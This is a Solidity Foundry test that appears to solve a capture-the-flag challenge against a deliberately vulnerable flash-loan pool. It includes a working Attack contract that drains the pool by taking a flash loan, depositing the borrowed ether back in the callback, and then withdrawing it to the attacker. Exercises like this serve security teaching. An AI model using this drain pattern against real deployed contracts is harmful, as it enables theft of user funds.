// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.prank(attacker);
        Attack attack = new Attack(address(sideEntranceLenderPool));
        attack.attack();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}

contract Attack {
    address immutable POOL;
    address immutable OWNER;

    constructor(address pool) {
        POOL = pool;
        OWNER = msg.sender;
    }

    function attack() external {
        (bool flashloan, ) = POOL.call(abi.encodeWithSignature("flashLoan(uint256)", 1000e18));
        console.log("malicious flashloan request: %s", flashloan);

        (bool withdraw, ) = POOL.call(abi.encodeWithSignature("withdraw()"));
        console.log("malicious withdraw request: %s", withdraw);
    }

    function execute() external payable {
        (bool deposit, ) = POOL.call{value: address(this).balance}(abi.encodeWithSignature("deposit()"));
        console.log("malicious reentrant deposit: %s", deposit);
    }

    fallback() external payable {
        (bool transfer, ) = OWNER.call{value: address(this).balance}("");
        console.log("malicious value transfer to attacker: %s", transfer);
    }
}
